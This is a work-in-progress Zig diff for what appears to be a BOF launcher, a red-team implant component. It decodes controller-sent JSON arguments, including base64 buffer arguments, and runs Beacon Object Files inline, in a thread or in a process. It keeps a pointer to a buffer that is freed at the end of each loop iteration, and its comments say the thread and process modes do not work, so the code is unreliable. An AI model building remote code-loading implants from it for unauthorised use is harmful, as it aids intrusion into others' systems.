@@ -128,17 +128,16 @@ const PendingBof = struct {
 };
 
 fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.json.Value) !void {
-    const bof_args = if (root.object.get("args")) |value| bof_args: {
+    const bof_argv = if (root.object.get("argv")) |value| bof_argv: {
         const len = try state.base64_decoder.calcSizeForSlice(value.string);
-        const bof_args = try allocator.alloc(u8, len);
-        errdefer allocator.free(bof_args);
-        _ = try state.base64_decoder.decode(bof_args, value.string);
-        break :bof_args bof_args;
+        const bof_argv = try allocator.alloc(u8, len);
+        errdefer allocator.free(bof_argv);
+        _ = try state.base64_decoder.decode(bof_argv, value.string);
+        break :bof_argv bof_argv;
     } else null;
-    defer if (bof_args) |args| allocator.free(args);
+    defer if (bof_argv) |args| allocator.free(args);
 
     // process header { exec_mode, args_spec, hash, [persistence] }
-    //
     const bof_header = root.object.get("header").?.string;
     var bof_header_iter = std.mem.splitScalar(u8, bof_header, ':');
 
@@ -147,7 +146,6 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
 
     // get arguments specification string
     const args_spec = bof_header_iter.next() orelse return error.BadData;
-    _ = args_spec;
 
     // get BOF's hash
     const hash = try std.fmt.parseInt(u64, bof_header_iter.next() orelse return error.BadData, 16);
@@ -155,8 +153,6 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
 
     // keep BOF in memory after running it?
     const is_persistent = if (bof_header_iter.next()) |v| std.mem.eql(u8, v, "persist") else false;
-
-    // TODO: handle 'buffers'
 
     var is_loaded: bool = false;
     var bof_to_exec: bof.Object = undefined;
@@ -182,23 +178,71 @@ fn receiveAndLaunchBof(allocator: std.mem.Allocator, state: *State, root: std.js
     var bof_context: ?*bof.Context = null;
     errdefer if (bof_context) |context| context.release();
 
+    // TODO: bof_args crafting
+    // build 'args' by parsing 'argv' and inspecting args_spec:
+    // possible values in 'header': iszZb
+
+    std.log.info("bof_argv: {any}", .{bof_argv.?});
+
+    const bof_args = try bof.Args.init();
+    defer bof_args.release();
+
+    var iter = std.mem.tokenizeScalar(u8, bof_argv.?, ' ');
+    var i: u32 = 0;
+
+    bof_args.begin();
+    while (iter.next()) |arg| {
+        std.log.info("Adding arg: {s}", .{arg});
+
+        if(args_spec[i] == 'b') {
+
+            const buf = if (root.object.get(arg)) |value| buf: {
+                const len = try state.base64_decoder.calcSizeForSlice(value.string);
+                const buf = try allocator.alloc(u8, len);
+                errdefer allocator.free(buf);
+                _ = try state.base64_decoder.decode(buf, value.string);
+                break :buf buf;
+            } else null;
+            defer if (buf) |b| allocator.free(b);
+ 
+            std.log.info("buf: {s} {s}", .{arg, buf.?});
+
+            const trimmed_buf = std.mem.trimRight(u8, buf.?, "\n");
+
+            const buf_len = try std.fmt.allocPrint(allocator, "i:{d}", .{trimmed_buf.len});
+            defer allocator.free(buf_len);
+
+            try bof_args.add(buf_len);
+            try bof_args.add(std.mem.asBytes(&trimmed_buf.ptr));
+
+        } else {
+            try bof_args.add(arg);
+        }
+
+        i += 1;
+    }
+    bof_args.end();
+
     if (std.mem.eql(u8, exec_mode, "inline")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
-        bof_context = try bof_to_exec.run(@constCast(bof_args));
+        bof_context = try bof_to_exec.run(bof_args.getBuffer());
+
     } else if (std.mem.eql(u8, exec_mode, "thread")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
+        // TODO: it won't work bof_argv needs to be converted to bofsArg first
         bof_context = try bof_to_exec.runAsyncThread(
-            @constCast(bof_args),
+            @constCast(bof_argv),
             null,
             null,
         );
     } else if (std.mem.eql(u8, exec_mode, "process")) {
         std.log.info("Execution mode: {s}-based", .{exec_mode});
 
+        // TODO: it won't work bof_argv needs to be converted to bofsArg first
         bof_context = try bof_to_exec.runAsyncProcess(
-            @constCast(bof_args),
+            @constCast(bof_argv),
             null,
             null,
         );
